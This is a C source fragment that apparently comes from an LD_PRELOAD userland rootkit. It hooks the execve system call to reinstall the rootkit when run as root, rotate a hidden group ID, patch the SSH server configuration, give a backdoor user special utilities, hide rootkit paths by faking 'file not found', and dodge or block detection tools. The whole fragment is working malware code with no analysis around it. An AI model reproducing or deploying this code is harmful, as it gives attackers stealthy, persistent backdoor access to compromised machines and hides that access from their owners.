int execve(const char *filename, char *const argv[], char *const envp[]){
#ifdef DO_REINSTALL
    if(!not_user(0)) reinstall();
#endif
#ifdef AUTO_GID_CHANGER
    gidchanger();
#endif
#ifdef PATCH_SSHD_CONFIG
    sshdpatch(REG_USR);
#endif

    hook(CEXECVE);

    if(is_bdusr()){
#ifdef BACKDOOR_UTIL
        if(!fnmatch("*/bdv", argv[0], FNM_PATHNAME))
            do_hidingutil(argv);
#endif
#ifdef PATCH_SSHD_CONFIG
        if(!fnmatch("*/sshdpatch", argv[0], FNM_PATHNAME)){
            sshdpatch(MAGIC_USR);
            exit(0);
        }
#endif
        return (long)call(CEXECVE, filename, argv, envp);
    }

    if(hidden_path(filename)){
        errno = ENOENT;
        return -1;
    }

#if defined(DO_REINSTALL) && defined(DO_EVASIONS)
    int evasion_status = evade(filename, argv, envp);
    switch(evasion_status){
        case VEVADE_DONE:
            exit(0);
        case VINVALID_PERM:
            errno = CANTEVADE_ERR;
            return -1;
        case VFORK_ERR:
            return -1;
        case VFORK_SUC:
            return (long)call(CEXECVE, filename, argv, envp);
        case VNOTHING_DONE:
            break;  /* ?? */
    }
#endif

#ifdef DO_EVASIONS
    if(block_strings(filename, argv)){
        errno = EPERM;
        return -1;
    }
#endif

    return (long)call(CEXECVE, filename, argv, envp);
}
